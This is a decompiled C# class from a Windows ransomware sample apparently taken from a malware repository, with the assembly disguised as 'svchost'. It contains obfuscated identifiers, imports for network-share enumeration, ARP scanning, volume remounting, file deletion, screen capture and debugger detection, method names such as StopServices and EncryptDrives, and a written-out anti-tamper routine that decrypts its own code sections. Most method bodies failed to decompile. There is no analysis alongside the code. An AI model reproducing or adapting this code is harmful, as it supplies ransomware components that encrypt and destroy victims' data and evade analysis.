// Decompiled with JetBrains decompiler
// Type: Loki.Pinvoke.ZZZZS
// Assembly: svchost, Version=2.1.0.0, Culture=neutral, PublicKeyToken=1033239b79792944
// MVID: AC1C84B8-A285-45A1-BF48-BDF83760C093
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.12-msil\HEUR-Trojan-Ransom.Win32.Generic-f2da3d1410c5058720a4307acf5fec7fc2b54285be9dd89eae108cce368dcde7.exe

using Microsoft.Win32.SafeHandles;
using Shell32;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using ZZZZZZZZK;
using ZZZZZZZZZg;
using ZZZZZZZZZI;
using ZZZZZZZZZY;
using ZZZZZZZZZZD;
using ZZZZZZZZZZS;
using ZZZZZZZZZZU;
using ZZZZZZZZZZZF;
using ZZZZZZZZZZZh;
using ZZZZZZZZZZZH;
using ZZZZZZZZZZZj;
using ZZZZZZZZZZZZZT;
using ZZZZZZZZZZZZZY;
using ZZZZZZZZZZZZZZB;
using ZZZZZZZZZZZZZZF;
using ZZZZZZZZZZZZZZh;
using ZZZZZZZZZZZZZZj;
using ZZZZZZZZZZZZZZm;
using ZZZZZZZZZZZZZZo;
using ZZZZZZZZZZZZZZq;
using ZZZZZZZZZZZZZZs;
using ZZZZZZZZZZZZZZu;
using ZZZZZZZZZZZZZZw;
using ZZZZZZZZZZZZZZz;
using ZZZZZZZZZZZZZZZA;
using ZZZZZZZZZZZZZZZI;
using ZZZZZZZZZZZZZZZK;
using ZZZZZZZZZZZZZZZM;
using ZZZZZZZZZZZZZZZO;
using ZZZZZZZZZZZZZZZQ;
using ZZZZZZZZZZZZZZZS;
using ZZZZZZZZZZZZZZZU;
using ZZZZZZZZZZZZZZZW;
using ZZZZZZZZZZZZZZZy;
using ZZZZZZZZZZZZZZZY;
using ZZZZZZZZZZZZZZZZa;
using ZZZZZZZZZZZZZZZZc;
using ZZZZZZZZZZZZZZZZf;
using ZZZZZZZZZZZZZZZZi;
using ZZZZZZZZZZZZZZZZk;
using ZZZZZZZZZZZZZZZZm;
using ZZZZZZZZZZZZZZZZo;
using ZZZZZZZZZZZZZZZZq;
using ZZZZZZZZZZZZZZZZs;
using ZZZZZZZZZZZZZZZZu;

namespace Loki.Pinvoke
{
  internal class ZZZZS
  {
    [ZZZZZZZZZE(-1492240456)]
    internal static ZZZZZZZZZZT \u0093å\u00B4\u00A86;
    [ZZZZZZZZZZw(667239933)]
    internal static ZZZZZZZZZZZG P\u0013\u0006À\u0025;
    [ZZZZZZZZZZZm(1029019712)]
    internal static ZZZZZZZZZZZZZZi z\u0088\u00B8\u00B1I;
    [ZZZZZZZZZn(1627200539)]
    internal static ZZZZZZZZZZZZZU ñÊ\u00B7uP;
    [ZZZZZZZZZV(-619009135)]
    internal static ZZZZZZZZZZZZZZk \u002C\u0081\u001D\u008B\u000D;
    [ZZZZZZZZZL(-435430507)]
    internal static ZZZZZZZZL ï\u00ACÔz_;
    [ZZZZZZZZP(1734142486)]
    internal static ZZZZZZZZZZZZZZn \u009Cæ3I\u007F;
    [ZZZZZZZZZE(2045305404)]
    internal static ZZZZZZZZZZ ÅùÀMx;
    [ZZZZZZZZZZl(-1004417538)]
    internal static ZZZZZZZZZZZZB È\u007FY9m;
    [ZZZZZZZZZr(-276056731)]
    internal static ZZZZZZZZZZZZZZp \u00B3þ\u002Cêý;
    [ZZZZZZZZZZl(-1555308468)]
    internal static ZZZZZZZZZZZZZZr \u0021\u0082p\u0001\u003D;
    [ZZZZZZZZZZZm(-620021912)]
    internal static ZZZZZZZZZZZZZZt üé\u008EM\u009D;
    [ZZZZZZZZW(-1163712701)]
    internal static ZZZZZZZZZZ \u0094\u00B7SÐÒ;
    [ZZZZZZZZZj(791677995)]
    internal static ZZZZZZZZZZZZZU Ýáâ3\u000E;
    [ZZZZZZZZZV(-1891668197)]
    internal static ZZZZZZZZL ñ\u0023\u003EØ\u0003;
    [ZZZZZZZZZZZm(1474770866)]
    internal static ZZZZZZZZZZZZZZv ù\u001A\u0017xÿ;
    [ZZZZZZZZZZb(-1872071357)]
    internal static ZZZZZZZZZZZZZZx \u0083\u0090eÔz;
    [ZZZZZZZZZZw(805722429)]
    internal static ZZZZZZZZZZZZZZA GÏ\u0084\u00B8\u005C;
    [ZZZZZZZZZn(-91479149)]
    internal static ZZZZZZZZZZZZZZ \u001B\u0094\u009F\u0026ÿ;
    [ZZZZZZZZP(-686333064)]
    internal static ZZZZZZZZZZT â\u009B\u00A5µ\u00A3;
    [ZZZZZZZZZZZm(1761736596)]
    internal static ZZZZZZZZZZZk \u00096\u0005\u00AC\u000F;
    [ZZZZZZZZZZb(456503747)]
    internal static ZZZZZZZZZZZi aGX\u008D\u0016;
    [ZZZZZZZZZZw(1227777305)]
    internal static ZZZZZZZZZZZZZZC \u008A\u002AÏ\u0021\u0022;
    [ZZZZZZZZZv(-282416051)]
    internal static ZZZZZZZZL þÓ\u000B\u0025\u009D;
    [ZZZZZZZZZZl(-284432902)]
    internal static ZZZZZZZZL \u005D\u00A7\u009BÒð;
    [ZZZZZZZZZv(1873578019)]
    internal static ZZZZZZZZZZZG \u0033\u008A\u00D7\u003A\u0004;
    [ZZZZZZZZZv(733050927)]
    internal static ZZZZZZZZZZZG B\u00B6ä\u008D\u0029;
    [ZZZZZZZZZZb(300347857)]
    internal static ZZZZZZZZZZ Ü\u0017Ùq\u0003;
    [ZZZZZZZZZn(1144450807)]
    internal static ZZZZZZZZZZZG B\u00A1\u0081\u00B2\u001E;
    [ZZZZZZZZZv(-1132968681)]
    internal static ZZZZZZZZZZZG EÐLN\u0017;
    [ZZZZZZZZZn(-187234847)]
    internal static ZZZZZZZZZZZG \u0033\u0027Ó\u00BFC;
    [ZZZZZZZZZZZm(-1939665182)]
    internal static ZZZZZZZZZZZG \u0094ô\u0099\u003Få;
    [ZZZZZZZZZd(-2000486007)]
    internal static ZZZZZZZZZZZZZZG düPÀ\u00AC;

    [DllImport("wininet.dll", EntryPoint = "InternetReadFile", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool ZZZZZy(
      IntPtr _param0,
      IntPtr _param1,
      uint _param2,
      out uint _param3);

    [DllImport("wininet.dll", EntryPoint = "InternetCloseHandle", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool ZZZZZz(IntPtr _param0);

    [DllImport("Kernel32.dll", EntryPoint = "QueryFullProcessImageName")]
    public static extern bool ZZZZZA(
      [In] IntPtr _param0,
      [In] uint _param1,
      [Out] StringBuilder _param2,
      [In, Out] ref uint _param3);

    [DllImport("Kernel32.dll", EntryPoint = "CreateThread", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr ZZZZZB(
      IntPtr _param0,
      uint _param1,
      Action _param2,
      IntPtr _param3,
      uint _param4,
      out uint _param5);

    [DllImport("kernel32.dll", EntryPoint = "WaitForMultipleObjects")]
    public static extern uint ZZZZZC(uint _param0, IntPtr[] _param1, bool _param2, uint _param3);

    [DllImport("Shell32.dll", EntryPoint = "ShellExecute", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr ZZZZZD(
      IntPtr _param0,
      string _param1,
      string _param2,
      string _param3,
      string _param4,
      int _param5);

    [DllImport("iphlpapi.dll", EntryPoint = "GetAdaptersInfo", CharSet = CharSet.Ansi)]
    public static extern int ZZZZZE(IntPtr _param0, ref long _param1);

    [DllImport("iphlpapi.dll", EntryPoint = "SendARP")]
    public static extern int ZZZZZF(uint _param0, uint _param1, byte[] _param2, ref int _param3);

    [DllImport("kernel32.dll", EntryPoint = "WaitForSingleObject", SetLastError = true)]
    public static extern uint ZZZZZG(IntPtr _param0, uint _param1);

    [DllImport("mpr.dll", EntryPoint = "WNetAddConnection2")]
    public static extern int ZZZZZH(
      ZZZZS.ZZZZZZZF _param0,
      string _param1,
      string _param2,
      int _param3);

    [DllImport("Netapi32.dll", EntryPoint = "NetApiBufferFree", SetLastError = true)]
    public static extern int ZZZZZI(IntPtr _param0);

    [DllImport("Netapi32.dll", EntryPoint = "NetShareEnum", CharSet = CharSet.Unicode)]
    public static extern int ZZZZZJ(
      StringBuilder _param0,
      int _param1,
      ref IntPtr _param2,
      uint _param3,
      ref int _param4,
      ref int _param5,
      ref int _param6);

    [DllImport("mpr.dll", EntryPoint = "WNetGetConnection", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern int ZZZZZK([MarshalAs(UnmanagedType.LPTStr)] string _param0, [MarshalAs(UnmanagedType.LPTStr)] StringBuilder _param1, ref int _param2);

    [DllImport("kernel32.dll", EntryPoint = "GlobalMemoryStatusEx", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool ZZZZZL([In, Out] ZZZZS.ZZZZZZZV _param0);

    [DllImport("shell32.dll", EntryPoint = "SHChangeNotify")]
    public static extern void ZZZZZM(int _param0, uint _param1, IntPtr _param2, IntPtr _param3);

    [DllImport("ntdll.dll", EntryPoint = "NtSetInformationProcess", SetLastError = true)]
    public static extern int ZZZZZN(IntPtr _param0, int _param1, ref int _param2, int _param3);

    [DllImport("kernel32.dll", EntryPoint = "DeleteFileW", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool ZZZZZO([MarshalAs(UnmanagedType.LPWStr)] string _param0);

    [DllImport("gdi32.dll", EntryPoint = "BitBlt")]
    public static extern bool ZZZZZP(
      IntPtr _param0,
      int _param1,
      int _param2,
      int _param3,
      int _param4,
      IntPtr _param5,
      int _param6,
      int _param7,
      int _param8);

    [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleBitmap")]
    public static extern IntPtr ZZZZZQ(IntPtr _param0, int _param1, int _param2);

    [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleDC")]
    public static extern IntPtr ZZZZZR(IntPtr _param0);

    [DllImport("gdi32.dll", EntryPoint = "DeleteDC")]
    public static extern bool ZZZZZS(IntPtr _param0);

    [DllImport("gdi32.dll", EntryPoint = "DeleteObject")]
    public static extern bool ZZZZZT(IntPtr _param0);

    [DllImport("gdi32.dll", EntryPoint = "SelectObject")]
    public static extern IntPtr ZZZZZU(IntPtr _param0, IntPtr _param1);

    [DllImport("user32.dll", EntryPoint = "GetWindowDC")]
    public static extern IntPtr ZZZZZV(IntPtr _param0);

    [DllImport("user32.dll", EntryPoint = "ReleaseDC")]
    public static extern IntPtr ZZZZZW(IntPtr _param0, IntPtr _param1);

    [DllImport("kernel32.dll", EntryPoint = "FindFirstVolume", SetLastError = true)]
    public static extern ZZZZS.ZZZZZZZZf ZZZZZX([Out] StringBuilder _param0, uint _param1);

    [DllImport("kernel32.dll", EntryPoint = "FindNextVolume", SetLastError = true)]
    public static extern bool ZZZZZY(ZZZZS.ZZZZZZZZf _param0, [Out] StringBuilder _param1, uint _param2);

    [DllImport("kernel32.dll", EntryPoint = "FindVolumeClose", SetLastError = true)]
    public static extern bool ZZZZZZ(IntPtr _param0);

    [DllImport("kernel32.dll", EntryPoint = "GetVolumeNameForVolumeMountPointW", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern bool ZZZZZZa(string _param0, [Out] StringBuilder _param1, uint _param2);

    [DllImport("kernel32.dll", EntryPoint = "SetVolumeMountPoint")]
    public static extern bool ZZZZZZb(string _param0, string _param1);

    public ZZZZS()
    {
      // ISSUE: unable to decompile the method.
    }

    static ZZZZS()
    {
      // ISSUE: unable to decompile the method.
    }

    internal static uint ZZZZZZZZi(string _param0)
    {
      // ISSUE: unable to decompile the method.
    }

    [DispId(0)]
    [SpecialName]
    [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
    [return: MarshalAs(UnmanagedType.BStr)]
    public abstract string get_Title();

    [SpecialName]
    [MethodImpl(MethodCodeType = MethodCodeType.Runtime)]
    public extern void _VtblGap1_4();

    [DispId(1610743813)]
    [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
    [return: MarshalAs(UnmanagedType.Interface)]
    public abstract ZZZZZZZZn ZZZZZZZZl([MarshalAs(UnmanagedType.BStr), In] string _param1);

    [SpecialName]
    [MethodImpl(MethodCodeType = MethodCodeType.Runtime)]
    public extern void _VtblGap1_2();

    [DispId(0)]
    [SpecialName]
    [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
    [return: MarshalAs(UnmanagedType.BStr)]
    public abstract string get_Name();

    [DispId(0)]
    [SpecialName]
    [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
    public abstract void set_Name([MarshalAs(UnmanagedType.BStr), In] string pbs);

    [SpecialName]
    [MethodImpl(MethodCodeType = MethodCodeType.Runtime)]
    public extern void _VtblGap2_1();

    [DispId(1610743813)]
    [SpecialName]
    [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
    [return: MarshalAs(UnmanagedType.IDispatch)]
    public abstract object get_GetLink();

    [SpecialName]
    [MethodImpl(MethodCodeType = MethodCodeType.Runtime)]
    public extern void _VtblGap1_2();

    [DispId(1610743810)]
    [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
    [return: MarshalAs(UnmanagedType.Interface)]
    public abstract ZZZZZZZZk ZZZZZZZZw([MarshalAs(UnmanagedType.Struct), In] object _param1);

    [DispId(1610743808)]
    [SpecialName]
    [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
    [return: MarshalAs(UnmanagedType.BStr)]
    public abstract string get_Path();

    [DispId(1610743808)]
    [SpecialName]
    [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
    public abstract void set_Path([MarshalAs(UnmanagedType.BStr), In] string pbs);

    static ZZZZS()
    {
      // ISSUE: unable to decompile the method.
    }

    public ZZZZS()
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u003CInit\u003Eb__20_0()
    {
      // ISSUE: unable to decompile the method.
    }

    [DebuggerHidden]
    public ZZZZS(int _param1)
    {
      // ISSUE: unable to decompile the method.
    }

    [DebuggerHidden]
    private void System\u002EIDisposable\u002EDispose()
    {
      // ISSUE: unable to decompile the method.
    }

    private bool MoveNext()
    {
      // ISSUE: unable to decompile the method.
    }

    [DebuggerHidden]
    [SpecialName]
    private string System\u002ECollections\u002EGeneric\u002EIEnumerator\u003CSystem\u002EString\u003E\u002Eget_Current()
    {
      // ISSUE: unable to decompile the method.
    }

    [DebuggerHidden]
    private void System\u002ECollections\u002EIEnumerator\u002EReset()
    {
      // ISSUE: unable to decompile the method.
    }

    [DebuggerHidden]
    [SpecialName]
    private object System\u002ECollections\u002EIEnumerator\u002Eget_Current()
    {
      // ISSUE: unable to decompile the method.
    }

    [DebuggerHidden]
    private IEnumerator<string> System\u002ECollections\u002EGeneric\u002EIEnumerable\u003CSystem\u002EString\u003E\u002EGetEnumerator()
    {
      // ISSUE: unable to decompile the method.
    }

    [DebuggerHidden]
    private IEnumerator System\u002ECollections\u002EIEnumerable\u002EGetEnumerator()
    {
      // ISSUE: unable to decompile the method.
    }

    static ZZZZS()
    {
      // ISSUE: unable to decompile the method.
    }

    public ZZZZS()
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u003CStopServices\u003Eb__4_0()
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u003CCatchUnhandledExceptions\u003Eb__10_0(
      object sender,
      UnhandledExceptionEventArgs e)
    {
      // ISSUE: unable to decompile the method.
    }

    internal bool \u003CChangeVolumesLabel\u003Eb__13_0(DriveInfo drive)
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u003CEncryptDrives\u003Eb__25_1()
    {
      // ISSUE: unable to decompile the method.
    }

    internal bool \u003CWriteAndShowInfo\u003Eb__50_0(DriveInfo drive)
    {
      // ISSUE: unable to decompile the method.
    }

    public enum ZZZZZZJ
    {
    }

    public struct ZZZZZZK
    {
      [ZZZZZZZZZZl(-817314104)]
      internal static ZZZZZZZZZZZi ÉF\u0023ïè;
      [ZZZZZZZZZZb(1411109917)]
      internal static ZZZZZZZZZZZi Bá\u0004\u00AFO;
      [ZZZZZZZZZZw(402241977)]
      internal static ZZZZZZZZZZZZZZZz Hþ0\u00BCØ;
      [ZZZZZZZZZj(1491200589)]
      internal static ZZZZZZZZZZZZZZZB \u007Doå\u007EÊ;
    }

    public enum ZZZZZZP
    {
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct ZZZZZZQ
    {
      [ZZZZZZZZH(817816104)]
      internal static ZZZZZZZZZZZZZU Y\u0024\u0018Ä\u0092;
      [ZZZZZZZZH(907276702)]
      internal static ZZZZZZZZZZZZZZZJ o\u000FØ\u0091\u000C;
      [ZZZZZZZZZZb(1525633123)]
      internal static ZZZZZZZZZZZZZZZL ÑKnZð;
      [ZZZZZZZZZr(-416045073)]
      internal static ZZZZZZZZZZZZZZZN í\u00B9X\u0090\u0022;
      [ZZZZZZZZZZf(367248995)]
      internal static ZZZZZZZZZZZZZU \u008EÌr\u0020F;
      [ZZZZZZZZZj(2017825425)]
      internal static ZZZZZZZZZZZI L\u002ALTß;
      [ZZZZZZZZZn(-1247194397)]
      internal static ZZZZZZZZZZZk T\u00B7EÛå;
      [ZZZZZZZZZZf(-299163355)]
      internal static ZZZZZZZZL \u003E\u0092\u0089\u0096\u0018;
      [ZZZZZZZZZr(-390609847)]
      internal static ZZZZZZZZZZZZZZZP \u00BB\u00B6bË\u0009;
      [ZZZZZZZZW(-64649419)]
      internal static ZZZZZZZZZZZZZZZR \u00A4\u005BTU\u0029;
    }

    public struct ZZZZZZZb
    {
      [ZZZZZZZZZj(-203808359)]
      internal static ZZZZZZZZZZZZZZZT î\u00BB\u00A771;
    }

    public struct ZZZZZZZd
    {
      [ZZZZZZZZH(-1896930772)]
      internal static ZZZZZZZZZZZZZZZV ò\u0023\u0011\u000A\u0003;
      [ZZZZZZZZP(2128868326)]
      internal static ZZZZZZZZZZZZZZZX \u001C\u005CôÐâ;
      [ZZZZZZZZZv(-1726515569)]
      internal static ZZZZZZZZZZZZZU X\u008F\u0011\u00B3\u0092;
      [ZZZZZZZZZv(2134431663)]
      internal static ZZZZZZZZZZZZZZZZ Z\u005CF\u0098Ý;
    }

    public struct ZZZZZZZi
    {
      [ZZZZZZZZZZZm(2138024708)]
      internal static ZZZZZZZZZZZZZZZZb \u0083\u0029\u002A\u009E\u0083;
      [ZZZZZZZZZd(-520161505)]
      internal static ZZZZZZZZZZZZZZZZd \u009F\u0022\u000F\u008Bã;
      [ZZZZZZZZZV(1212258655)]
      internal static ZZZZZZZZZh \u005E\u0026wÛé;
      [ZZZZZZZZH(-679491056)]
      internal static ZZZZZZZZL Æ\u00A5\u00BB\u0011H;
      [ZZZZZZZZZV(-369560303)]
      internal static ZZZZZZZZZZZZZZZZg Hç\u0012n\u0029;
      [ZZZZZZZZZZZm(-1273436424)]
      internal static ZZZZZZZZZZZZZZZZj \u00ACKÄ\u002Al;
      [ZZZZZZZZZZZm(880404954)]
      internal static ZZZZZZZZZZZZZZZZl \u00A5\u0086\u00BB\u00B1È;
      [ZZZZZZZZZr(264909657)]
      internal static ZZZZZZZZZZZZZZZZn º\u001DA\u005DH;
      [ZZZZZZZZZr(-355099987)]
      internal static ZZZZZZZZZZZZZZC \u008Eé0\u00B4p;
      [ZZZZZZZZZV(1576939317)]
      internal static ZZZZZZZZZZE gÇT\u00BB\u00B6;
      [ZZZZZZZZZZl(2102269542)]
      internal static ZZZZZZZZZJ \u0019\u0023ä\u00BE\u0010;
      [ZZZZZZZZZZf(2094237919)]
      internal static ZZZZZZZZL \u0090\u002EÍ_p;
      [ZZZZZZZZH(-1796832270)]
      internal static ZZZZZZZZZZZZZZZZp WX3Xj;
      [ZZZZZZZZZZl(1438509330)]
      internal static ZZZZZZZZZZV \u00BFêLåù;
      [ZZZZZZZZZr(-613607647)]
      internal static ZZZZZZZZZZZZZZZZr håÊ\u002D\u008F;
      [ZZZZZZZZH(1981679836)]
      internal static ZZZZZZZZZZZZZZZZt Àl\u0098nÌ;
      [ZZZZZZZZZj(975737369)]
      internal static ZZZZZZZZZZZZZZZZt \u0030\u0001\u005EFv;
      [ZZZZZZZZP(-505459918)]
      internal static ZZZZZZZZZZZZZZZZv \u0086Ê\u0080Gï;
    }

    public enum ZZZZZZZB
    {
    }

    public enum ZZZZZZZC
    {
    }

    public enum ZZZZZZZD
    {
    }

    public enum ZZZZZZZE
    {
    }

    [StructLayout(LayoutKind.Sequential)]
    public class ZZZZZZZF
    {
      public static Buffer ZZZZZZZZZZZZZZZZZZR;
      public static Encoding ZZZZZZZZZZZZZZZZZZS;
      public static GroupCollection ZZZZZZZZZZZZZZZZZZT;
      public static Capture ZZZZZZZZZZZZZZZZZZU;
      public static DateTime ZZZZZZZZZZZZZZZZZZV;
      public static Thread ZZZZZZZZZZZZZZZZZZW;
      public static StringBuilder ZZZZZZZZZZZZZZZZZZX;
      public static ProcessStartInfo ZZZZZZZZZZZZZZZZZZY;

      static void ZZZZZZZZZZZZZZZZZZZZj([In] RuntimeFieldHandle obj0, [In] byte obj1)
      {
        FieldInfo fieldFromHandle = FieldInfo.GetFieldFromHandle(obj0);
        byte[] numArray1 = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
        int length = numArray1.Length;
        int num1;
        int num2;
        int num3;
        int num4 = fieldFromHandle.GetOptionalCustomModifiers()[0].MetadataToken + (((int) fieldFromHandle.Name[3] ^ (int) numArray1[num1 = length - 1]) << 0) + (((int) fieldFromHandle.Name[2] ^ (int) numArray1[num2 = num1 - 1]) << 16) + (((int) fieldFromHandle.Name[1] ^ (int) numArray1[num3 = num2 - 1]) << 8);
        int num5 = num3 - 1;
        int num6;
        int metadataToken = (num4 + (((int) fieldFromHandle.Name[4] ^ (int) numArray1[num6 = num5 - 1]) << 24)) * -1894012119 * fieldFromHandle.GetCustomAttributes(false)[0].GetHashCode();
        MethodBase method1 = fieldFromHandle.Module.ResolveMethod(metadataToken);
        Type fieldType = fieldFromHandle.FieldType;
        if (method1.IsStatic)
        {
          fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldType, (MethodInfo) method1));
        }
        else
        {
          DynamicMethod dynamicMethod = (DynamicMethod) null;
          Type[] parameterTypes = (Type[]) null;
          foreach (MethodInfo method2 in fieldFromHandle.FieldType.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic))
          {
            if ((object) method2.DeclaringType == (object) fieldType)
            {
              ParameterInfo[] parameters = method2.GetParameters();
              parameterTypes = new Type[parameters.Length];
              for (int index = 0; index < parameterTypes.Length; ++index)
                parameterTypes[index] = parameters[index].ParameterType;
              Type declaringType = method1.DeclaringType;
              dynamicMethod = new DynamicMethod("", method2.ReturnType, parameterTypes, fieldType, true);
              break;
            }
          }
          DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
          dynamicIlInfo.SetLocalSignature(new byte[2]
          {
            (byte) 7,
            (byte) 0
          });
          byte[] code = new byte[2 * parameterTypes.Length + 6];
          int num7 = 0;
          for (int index1 = 0; index1 < parameterTypes.Length; ++index1)
          {
            byte[] numArray2 = code;
            int index2 = num7;
            int num8 = index2 + 1;
            numArray2[index2] = (byte) 14;
            byte[] numArray3 = code;
            int index3 = num8;
            num7 = index3 + 1;
            int num9 = (int) (byte) index1;
            numArray3[index3] = (byte) num9;
          }
          byte[] numArray4 = code;
          int index4 = num7;
          int num10 = index4 + 1;
          int num11 = (int) (byte) ((uint) (byte) fieldFromHandle.Name[0] ^ (uint) obj1);
          numArray4[index4] = (byte) num11;
          int tokenFor = dynamicIlInfo.GetTokenFor(method1.MethodHandle);
          byte[] numArray5 = code;
          int index5 = num10;
          int num12 = index5 + 1;
          int num13 = (int) (byte) tokenFor;
          numArray5[index5] = (byte) num13;
          byte[] numArray6 = code;
          int index6 = num12;
          int num14 = index6 + 1;
          int num15 = (int) (byte) (tokenFor >> 8);
          numArray6[index6] = (byte) num15;
          byte[] numArray7 = code;
          int index7 = num14;
          int num16 = index7 + 1;
          int num17 = (int) (byte) (tokenFor >> 16);
          numArray7[index7] = (byte) num17;
          byte[] numArray8 = code;
          int index8 = num16;
          int index9 = index8 + 1;
          int num18 = (int) (byte) (tokenFor >> 24);
          numArray8[index8] = (byte) num18;
          code[index9] = (byte) 42;
          dynamicIlInfo.SetCode(code, parameterTypes.Length + 1);
          fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldType));
        }
      }
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct ZZZZZZZO
    {
      public static Process ZZZZZZZZZZZZZZZZZZZ;
      public static Win32Exception ZZZZZZZZZZZZZZZZZZZa;
      public static ServiceController ZZZZZZZZZZZZZZZZZZZb;

      [DllImport("kernel32.dll", EntryPoint = "VirtualProtect")]
      internal static extern bool ZZZZZZZZZZZZZZZZZZZZk(
        [In] IntPtr obj0,
        [In] uint obj1,
        [In] uint obj2,
        [In] ref uint obj3);

      [DllImport("kernel32.dll", EntryPoint = "SwitchToThread")]
      internal static extern bool ZZZZZZZZZZZZZZZZZZZZl();
    }

    public enum ZZZZZZZT
    {
    }

    public enum ZZZZZZZU
    {
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public class ZZZZZZZV
    {
      public static RectangleF ZZZZZZZZZZZZZZZZZZZo;
      public static ImageFormat ZZZZZZZZZZZZZZZZZZZp;
      public static Decimal ZZZZZZZZZZZZZZZZZZZq;
      public static uint ZZZZZZZZZZZZZZZZZZZr;
      public static TimeZone ZZZZZZZZZZZZZZZZZZZs;
      public static RegionInfo ZZZZZZZZZZZZZZZZZZZt;
      public static ZZZZZZZZZZZZZZZZZZZu ZZZZZZZZZZZZZZZZZZZv;
      public static byte[] ZZZZZZZZZZZZZZZZZZZS;
      public static IntPtr[] ZZZZZZZZZZZZZZZZZZZT;

      [DllImport("kernel32.dll", EntryPoint = "IsDebuggerPresent", CharSet = CharSet.Auto)]
      internal static extern bool ZZZZZZZZZZZZZZZZZZZZm();
    }

    public class ZZZZZZZZf : SafeHandleZeroOrMinusOneIsInvalid
    {
      [DllImport("kernel32.dll", EntryPoint = "CheckRemoteDebuggerPresent", SetLastError = true)]
      internal static extern bool ZZZZZZZZZZZZZZZZZZZZn([In] IntPtr obj0, [In] ref bool obj1);

      internal static Module ZZZZZZZZZZZZZZZZZZZZo([In] uint obj0) => typeof (Koi).Module;

      internal static unsafe void ZZZZZZZZZZZZZZZZZZZZp()
      {
        ZZZZS.ZZZZZZZO.ZZZZZZZZZZZZZZZZZZZZl();
        string variable = "P0";
        Process.GetProcesses();
        Process process = new Process();
        uint num1 = 1337;
        Module m = ZZZZS.ZZZZZZZZf.ZZZZZZZZZZZZZZZZZZZZo(2051872369U);
        if (m.Assembly.Location.Length == 0)
        {
          num1 = Convert.ToUInt32(Environment.GetEnvironmentVariable(variable));
          Environment.SetEnvironmentVariable(variable, "");
        }
        string fullyQualifiedName = m.FullyQualifiedName;
        bool flag = fullyQualifiedName.Length > 0 && fullyQualifiedName[0] == '<';
        byte* hinstance = (byte*) (void*) Marshal.GetHINSTANCE(m);
        byte* numPtr1 = hinstance + *(uint*) (hinstance + 60);
        ushort num2 = *(ushort*) (numPtr1 + 6);
        ushort num3 = *(ushort*) (numPtr1 + 20);
        uint* numPtr2 = (uint*) null;
        uint num4 = 0;
        uint* numPtr3 = (uint*) (numPtr1 + 24 + (int) num3);
        uint num5 = 2649754736;
        uint num6 = 2051872369;
        uint num7 = 2926611905;
        uint num8 = 1311778419;
        for (int index1 = 0; index1 < (int) num2; ++index1)
        {
          uint* numPtr4 = numPtr3;
          uint* numPtr5 = (uint*) ((IntPtr) numPtr4 + 4);
          int num9 = (int) *numPtr4;
          uint* numPtr6 = numPtr5;
          uint* numPtr7 = (uint*) ((IntPtr) numPtr6 + 4);
          int num10 = (int) *numPtr6;
          uint num11 = (uint) (num9 * num10);
          if (num11 == 3356894068U)
          {
            numPtr2 = (uint*) (hinstance + (flag ? numPtr7[3] : numPtr7[1]));
            num4 = (flag ? numPtr7[2] : *numPtr7) >> 2;
          }
          else if (num11 > 0U)
          {
            uint* numPtr8 = (uint*) (hinstance + (flag ? numPtr7[3] : numPtr7[1]));
            uint num12 = numPtr7[2] >> 2;
            for (uint index2 = 0; index2 < num12; ++index2)
            {
              uint num13 = (uint) (((int) num5 ^ (int) *numPtr8++) + (int) num6 + (int) num7 * (int) num8);
              num5 = num6;
              num6 = num8;
              num8 = num13;
            }
          }
          numPtr3 = numPtr7 + 8;
        }
        uint[] numArray1 = new uint[16];
        uint[] numArray2 = new uint[16];
        for (int index = 0; index < 16; ++index)
        {
          numArray1[index] = num8;
          numArray2[index] = num6;
          uint num14 = num6 >> 6 | num6 << 26;
          num6 = num7 >> 4 | num7 << 28;
          num7 = num8 >> 8 | num8 << 24;
          num8 = num14 >> 12 | num14 << 22;
        }
        numArray1[0] = numArray1[0] ^ numArray2[0];
        numArray1[1] = numArray1[1] * numArray2[1];
        numArray1[2] = numArray1[2] + numArray2[2];
        numArray1[3] = numArray1[3] ^ numArray2[3];
        numArray1[4] = numArray1[4] * numArray2[4];
        numArray1[5] = numArray1[5] + numArray2[5];
        numArray1[6] = numArray1[6] ^ numArray2[6];
        numArray1[7] = numArray1[7] * numArray2[7];
